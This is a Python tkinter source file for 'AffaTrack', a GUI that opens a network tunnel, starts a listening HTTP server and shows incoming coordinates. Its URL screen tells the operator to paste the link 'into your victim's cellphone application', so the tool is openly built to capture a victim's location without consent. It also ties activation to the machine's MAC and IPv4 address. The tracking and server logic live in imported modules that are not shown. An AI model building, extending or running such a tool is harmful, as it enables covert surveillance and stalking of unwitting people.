import tkinter as tk
from tkinter import *
from tkinter import ttk
import sys
import tokenMan
from tokenMan import collec_mac_ipv4
import threading
import server
import requests
import time
from server import HTTPServerWrapper


openTunnel = True
defaultTunnelSettingsFlag = True
defaultServerSettingsFlag = True

defaultTunnelSettings = {
    'host' : "0.0.0.0",
    'port' : 1945,
    'protocol' : "http"
}
defaultServerSettings = {
    'host' : '0.0.0.0',
    'port' : 1945
}


class activation_interface():
    def run_activation_interface(self):

        mac_collector = collec_mac_ipv4()  
        ipv4_collector = collec_mac_ipv4()  

        def get_identifiers(newMAc = mac_collector, newIpv4 = ipv4_collector):
            identifiers = {'Mac':newMAc, 'ipv4':newIpv4}
            return identifiers



        def compare_tokens(token):
            userToken = tokenEntry.get()

           #//validacion de token usuario y token generado

            while True:
                if userToken == token:
                    print("validado con exito")
                    activWind.destroy()
                    new_main_interface = mainInterface()
                    new_main_interface.run_main_interface()
   

                    break
                else:

                    activWind.destroy()
                    print("token no valido")
                    break
 
            print(userToken)

        def closeProgram():
            sys.exit()

        identifiers = get_identifiers()

        newGenToken = tokenMan.Token(*identifiers)
        token = newGenToken.generate_token()

        activWind = tk.Tk()
        activWind.title("AffaTrack Activation Window")
        activWind.geometry("800x500")
        activWind.configure(bg="black")
        title = tk.Label(activWind, 
            text="AffaTrack",
            bg="black", 
            fg="red", 
            font=("Helvetica",40,"bold"), 
            anchor="center"
            ).pack(side="top", fill="both", anchor="n",pady=10)

        instructionsLabel1 = tk.Label(activWind,
            text="Enter the provided activation Token to start",
            bg = "black",
            fg = "white",
            font=20,
            anchor="center",
  
        ).pack(fill="both",anchor="n", pady=20,)

        tokenEntry = Entry(activWind, width=40)
        tokenEntry.pack(anchor="n", pady= 20)

        activateButton = Button(activWind, 
            text="Activate", 
            width=20 , 
            bg="#999595", fg="black" 
            ,command=lambda: compare_tokens(token)
            ).pack(pady=50)


        exitButton = Button(activWind, text="Exit", width=20 , bg="#999595", fg="black" ,command=closeProgram).pack(pady=20)

        activWind.mainloop()





class mainInterface():
    def run_main_interface(self):

        def start_server_wind():
            mainWind.withdraw()
            newServerWind = tunnel_creator_interface()
            newServerWind.run_tunnel_creator_interface()


        mainWind = tk.Tk()
        mainWind.title("AffaTrack main")
        mainWind.geometry("800x500")
        mainWind.configure(bg="black")
        title = tk.Label(mainWind, 
            text="AffaTrack",
            bg="black", 
            fg="red", 
            font=("Helvetica",40,"bold"), 
            anchor="center"
            ).pack(side="top", fill="both", anchor="n",pady=10)

        
        serverButton = Button(mainWind, 
            text="Generate URL", 
            width=20 , 
            bg="#999595", fg="black",
            command=start_server_wind
            ).pack(pady=30)
        

                
        settingsButton = Button(mainWind, 
            text="Server Settings", 
            width=20 , 
            bg="#999595", fg="black",
            ).pack(pady=30)


        helpButton = Button(mainWind, 
            text="Help", 
            width=20 , 
            bg="#999595", fg="black",
            ).pack(pady=30)

        exitButton = Button(mainWind, 
            text="Exit", 
            width=20 , 
            bg="#999595", fg="black",
            ).pack(pady=30)
        


        mainWind.mainloop()



class tunnel_creator_interface():
    def run_tunnel_creator_interface(self):


        def stopTunnelUrl(new_url,http_tunel, show_generated_url, stopTunnelButton, startServerButton ):
            new_url.stop_http_tunnel(http_tunel) #objeto new_url llama al metodo stop_http_tunnel para cerra el tunel
            
            generating_url_message.config(text="The tunnel has been closed")
            show_generated_url.destroy()
            stopTunnelButton.config(
                text="Menu"
            )
            startServerButton.destroy()

        def stopSever():
            pass


        def generate_url(host,port,protocol):



            new_url = server.http_tunnel(host,port,protocol)
            url, http_tunel = new_url.start_http_tunnel()
            progress_bar.stop()
            progress_bar.destroy()
            generating_url_message.config(text="Copy and paste this URL into your victim's cellphone application.")
            show_generated_url = Text(tunnelWind, height=10, width=50)
            show_generated_url.pack(pady=20)
            show_generated_url.insert(tk.END, url)
            
            startServerButton = Button(tunnelWind, 
                text="Start Server", 
                width=20,
                bg="#999595", 
                fg="black",
                command=lambda: start_server_interface(url,startServerButton)
            )
            startServerButton.pack(pady=15)

            stopTunnelButton = Button(tunnelWind, 
                text="Stop Tunnel", 
                width=20,
                bg="#999595", 
                fg="black",
                command= lambda: stopTunnelUrl(new_url,http_tunel,show_generated_url, stopTunnelButton, startServerButton)
            )
            hilo = threading.current_thread()
            print(hilo)
            stopTunnelButton.pack(pady=15)



        def start_server_interface(url,startServerButton):

            newServerWind = server_listening_interface(url)
            newServerWind.run_server_interface()


        def start_generating_thread_url(host,port,protocol):

            
            url_thread = threading.Thread(target= lambda:generate_url(host,port,protocol))
            url_thread.start()



        tunnelWind = tk.Tk()    

        tunnelWind.title("AffaTrack main")
        tunnelWind.geometry("800x500")
        tunnelWind.configure(bg="black")
        title = tk.Label(tunnelWind, 
            text="AffaTrack",
            bg="black", 
            fg="red", 
            font=("Helvetica",40,"bold"), 
            anchor="center"
            ).pack(side="top", fill="both", anchor="n",pady=10)
        
        
        generating_url_message = tk.Label(tunnelWind,
            text="Generando url...",
            bg = "black",
            fg = "white",
            font=15,
            anchor="center",
  
        )
        generating_url_message.pack(fill="both",anchor="n", pady=20,)

        progress_bar = ttk.Progressbar(tunnelWind, orient="horizontal", length=500, mode="indeterminate")
        progress_bar.pack(pady=20)
        progress_bar.start()

        if defaultTunnelSettingsFlag == True:
            start_generating_thread_url(**defaultTunnelSettings)
        else:
            pass  #custumed settings case

        


        tunnelWind.mainloop()
class server_listening_interface():
    def __init__(self, url):
        self.url = url
        self.server_instance = None  

    def run_server_interface(self):
        def start_http_server(host, port, widget):
            self.server_instance = HTTPServerWrapper(host, port)  
            self.server_instance.run(widget)


        def verify_active_url(url):
            try:
                response = requests.get(url)
                print(f"Verificando URL: {url}, Código de estado: {response.status_code}")
                if response.status_code == 200:
                    return True
            except requests.ConnectionError as e:
                print("Conexión rechazada:", e)
            return False


        def close_window_case_url_false(root, url, message1):
            while True:
                if not verify_active_url(url):
                    message1.config(text='The tunnel has been closed.')
                    root.destroy()
                    break

        if defaultServerSettingsFlag:
            serverWind = tk.Tk()
            serverWind.title("AffaTrack HTTP server listening..")
            serverWind.geometry("800x700")
            serverWind.configure(bg="black")

          
            title = tk.Label(serverWind, text="AffaTrack", bg="black", fg="red", font=("Helvetica", 40, "bold"), anchor="center")
            title.pack(side="top", fill="both", anchor="n", pady=10)
            message1 = Label(serverWind, text="Server listening on {}, port: {} ...".format(defaultServerSettings['host'], defaultServerSettings['port']),
                                 bg="black", fg="white", font=15, anchor="center")
            message1.pack(pady=20)

            coordinatesWidgetPrints = Text(serverWind, height=20, width=80)
            coordinatesWidgetPrints.pack(pady=5)
            server_manager_thread = threading.Thread(target=lambda: start_http_server(defaultServerSettings['host'], defaultServerSettings['port'], coordinatesWidgetPrints))
            server_manager_thread.start()

            if verify_active_url(self.url):
            
                stop_server_button = Button(serverWind, text="Stop Server", command=self.stop_server)
                stop_server_button.pack(pady=20)

                ngrok_monitor_thread = threading.Thread(target=close_window_case_url_false, args=(serverWind, self.url, message1))
                ngrok_monitor_thread.daemon = True
                ngrok_monitor_thread.start()

                serverWind.mainloop()

    def stop_server(self):
        if self.server_instance:
            self.server_instance.stop()
        else:
            print("No server instance to stop.")
            



window = mainInterface()
window.run_main_interface()